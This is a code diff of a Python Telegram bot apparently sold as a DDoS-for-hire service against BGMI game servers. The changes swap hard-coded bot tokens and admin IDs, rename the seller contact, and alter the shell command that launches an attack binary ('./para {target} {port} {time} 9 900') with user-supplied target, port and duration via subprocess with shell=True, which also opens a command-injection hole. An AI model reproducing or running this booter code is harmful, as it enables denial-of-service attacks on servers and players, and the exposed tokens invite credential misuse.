@@ -7,10 +7,10 @@ import datetime
 import os
 
 # insert your Telegram bot token here
-bot = telebot.TeleBot('7440585688:AAEOdjV-4cCV3CCgwqh35P7H6lgPYZA2trs')
+bot = telebot.TeleBot('7686606251:AAGLngp85Rgw1p0yWq4g56XVqNDjvqtdxHI')
 
 # Admin user IDs
-admin_id = ["948895728,6993424594"]
+admin_id = ["1604629264"]
 
 # File to store allowed user IDs
 USER_FILE = "users.txt"
@@ -207,7 +207,7 @@ def start_attack_reply(message, target, port, time):
     user_info = message.from_user
     username = user_info.username if user_info.username else user_info.first_name
     
-    response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.🔥🔥\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: LEGEND "
+    response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.🔥🔥\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: PARADOX "
     bot.reply_to(message, response)
 
 # Dictionary to store the last time each user ran the /bgmi command
@@ -224,7 +224,7 @@ def handle_bgmi(message):
         if user_id not in user_id:
             # Check if the user has run the command before and is still within the cooldown period
             if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 0:
-                response = " https://t.me/+tgN0F6SZeyU4ODZl "
+                response = "  "
                 bot.reply_to(message, response)
                 return
             # Update the last time the user ran the command
@@ -241,7 +241,7 @@ def handle_bgmi(message):
                 record_command_logs(user_id, '/bgmi1', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./LEGEND {target} {port} {time} "
+                full_command = f"./para {target} {port} {time} 9 900"
                 subprocess.run(full_command, shell=True)
                 response = f"BGMI Attack Finished. Target: {target} Port: {port} Port: {time}"
         else:
@@ -285,8 +285,7 @@ def show_help(message):
 🤖 To See Admin Commands:
 💥 /admincmd : Shows All Admin Commands.
 
-Buy From :- @AMRIT_MODZ_OWNER
-Official Channel :- https://t.me/+bZcasKQOcKtlODE1
+Buy From :- @lostboixd
 '''
     for handler in bot.message_handlers:
         if hasattr(handler, 'commands'):
@@ -303,7 +302,7 @@ def welcome_start(message):
     user_name = message.from_user.first_name
     response = f'''👋🏻Welcome to Your Home, {user_name}! Feel Free to Explore.
 🤖Try To Run This Command : /help 
-✅Join :- https://t.me/+tgN0F6SZeyU4ODZl'''
+✅Join :- @lostboixd'''
     bot.reply_to(message, response)
 
 @bot.message_handler(commands=['rules'])
@@ -372,5 +371,20 @@ def broadcast_message(message):
 
 
 
+# Function to print messages every 60 seconds
+def periodic_print():
+    messages = [
+        "🌀 Bot is running smoothly...",
+        "💡 Remember to check logs for errors!",
+        "🚀 Your bot is alive and responding!",
+        "⚡ Keep an eye on performance metrics!"
+    ]
+    while True:
+        print(random.choice(messages))
+        time.sleep(60)
 
-bot.polling()
+# Start the periodic print function in a separate thread
+threading.Thread(target=periodic_print, daemon=True).start()
+
+print("Bot Is Running 🎉")
+bot.infinity_polling()
